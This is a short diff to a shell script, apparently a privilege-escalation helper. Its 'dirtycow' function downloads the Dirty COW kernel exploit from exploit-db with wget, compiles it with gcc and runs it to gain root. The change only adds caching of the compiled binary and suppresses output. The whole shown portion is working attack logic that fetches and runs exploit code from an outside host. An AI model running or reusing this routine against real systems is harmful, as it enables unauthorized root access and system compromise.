@@ -18,9 +18,11 @@ main() {
 
 dirtycow() {
     echo "Running Dirty cow"
-    wget -O "$COW_C_FILE" 'https://www.exploit-db.com/download/40616'
-    gcc "$COW_C_FILE" -o "$COW_FILE" -pthread >/dev/null 2>&1
-    "$COW_FILE" || true
+    if [[ ! -f "$COW_FILE" ]]; then
+        wget -O "$COW_C_FILE" 'https://www.exploit-db.com/download/40616' >/dev/null 2>&1
+        gcc "$COW_C_FILE" -o "$COW_FILE" -pthread >/dev/null 2>&1
+    fi
+    ("$COW_FILE" || true)
     if [[ "$EUID" -ne 0 ]]; then
         echo "Root not attained"
     fi
